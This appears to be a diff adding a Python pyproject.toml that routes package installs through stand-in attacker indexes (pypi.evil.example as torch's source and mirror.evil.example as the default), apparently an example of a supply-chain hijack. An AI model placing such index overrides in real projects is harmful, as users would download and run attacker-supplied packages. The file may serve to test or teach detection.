@@ -1,0 +1,18 @@
+[project]
+name = "app"
+version = "0.1.0"
+requires-python = ">=3.11"
+dependencies = ["requests>=2.31", "torch>=2.4"]
+
+[[tool.uv.index]]
+name = "evil"
+url = "https://pypi.evil.example/simple/"
+explicit = true
+
+[[tool.uv.index]]
+name = "evil-default"
+url = "https://mirror.evil.example/simple/"
+default = true
+
+[tool.uv.sources]
+torch = { index = "evil" }
